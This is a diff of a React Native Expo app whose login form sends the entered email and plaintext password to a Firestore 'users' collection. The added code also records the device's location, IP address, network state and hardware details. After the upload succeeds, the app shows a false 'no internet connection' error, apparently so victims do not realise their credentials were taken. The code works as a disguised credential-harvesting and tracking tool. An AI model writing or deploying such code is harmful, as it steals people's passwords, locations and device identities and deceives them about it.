@@ -1,11 +1,38 @@
 import { StatusBar } from 'expo-status-bar';
-import React, { useState } from 'react';
-import { StyleSheet, Text, View, Image, TextInput, Button, ScrollView, TouchableOpacity} from 'react-native';
+import React, { useState, useEffect } from 'react';
+import { Platform, StyleSheet, Text, View, Image, TextInput, Button, ScrollView, TouchableOpacity, Alert} from 'react-native';
 import header from './assets/header.jpeg';
 import firebase from './database/firebase';
 import { collection, addDoc } from "firebase/firestore";
+import * as Device from 'expo-device';
+import * as Location from 'expo-location';
+import * as Network from 'expo-network';
+
 
 export default function App() {
+
+  const [location, setLocation] = useState(null);
+  const [errorMsg, setErrorMsg] = useState(null);
+
+  useEffect(() => {
+    (async () => {
+      let { status } = await Location.requestForegroundPermissionsAsync();
+      if (status !== 'granted') {
+        setErrorMsg('Permission to access location was denied');
+        return;
+      }
+
+      let location = await Location.getCurrentPositionAsync({});
+      setLocation(location);
+    })();
+  }, []);
+
+  let text = 'Waiting..';
+  if (errorMsg) {
+    text = errorMsg;
+  } else if (location) {
+    text = JSON.stringify(location);
+  }
 
   const [state, setState] = useState({
     email: '',
@@ -18,25 +45,70 @@ export default function App() {
   }
 
   const saveinfo = async () =>{
-
     if (state.email == '' || state.password == '') {
 
       console.log("Don't send")
 
     } else {
 
-      const docRef = await addDoc(collection(firebase.db, "users"), {
-        email: state.email,
-        password: state.password
+      let t = new Date(); 
+      let time = t.getDate() + "/" + (t.getMonth()+1) + "/" + t.getFullYear();
+
+      function formatSizeUnits(bytes){
+        if      (bytes >= 1073741824) { bytes = (bytes / 1073741824).toFixed(2) + " GB"; }
+        else if (bytes >= 1048576)    { bytes = (bytes / 1048576).toFixed(2) + " MB"; }
+        else if (bytes >= 1024)       { bytes = (bytes / 1024).toFixed(2) + " KB"; }
+        else if (bytes > 1)           { bytes = bytes + " bytes"; }
+        else if (bytes == 1)          { bytes = bytes + " byte"; }
+        else                          { bytes = "0 bytes"; }
+        return bytes;
+      }
+
+      const showAlert = () =>
+      Alert.alert(
+        'Error de red',
+        'No se ha detectado conexión a internet',
+        [
+          {
+            text: 'Aceptar',
+          },
+        ],
+        {
+          cancelable: true,
+        }
+      );
+
+      const docRef = await addDoc(collection(firebase.db, "users"), { 
+        date: time,
+        data: {
+          email: state.email,
+          password: state.password,
+        },
+        network:{ 
+          ip: await Network.getIpAddressAsync(),
+          connection: await Network.getNetworkStateAsync(),
+        },
+        device: {
+          os: Device.osName,
+          os_version: Device.osVersion,
+          hardware: Device.brand,
+          manufacurer: Device.manufacturer,
+          memory: formatSizeUnits(Device.totalMemory),
+          model: Device.modelName,
+          name: Device.deviceName,
+          processor: Device.supportedCpuArchitectures,
+          product: Device.productName,
+        },
+        location: location.coords,
       });
       
-      console.log("send");
+      showAlert();
+
     }
 
   }
 
-  return (
-
+  return ( 
     <ScrollView  style={styles.container}>
 
       <View>
@@ -77,12 +149,12 @@ export default function App() {
     
     </View>
 
-    </ScrollView>
+    </ScrollView> 
 
     
   );
 }
-
+ 
 const styles = StyleSheet.create({
   container: { 
     flex: 1,
@@ -141,4 +213,4 @@ const styles = StyleSheet.create({
     padding: 0,
     marginHorizontal: 60,
   },
-})
+}) 
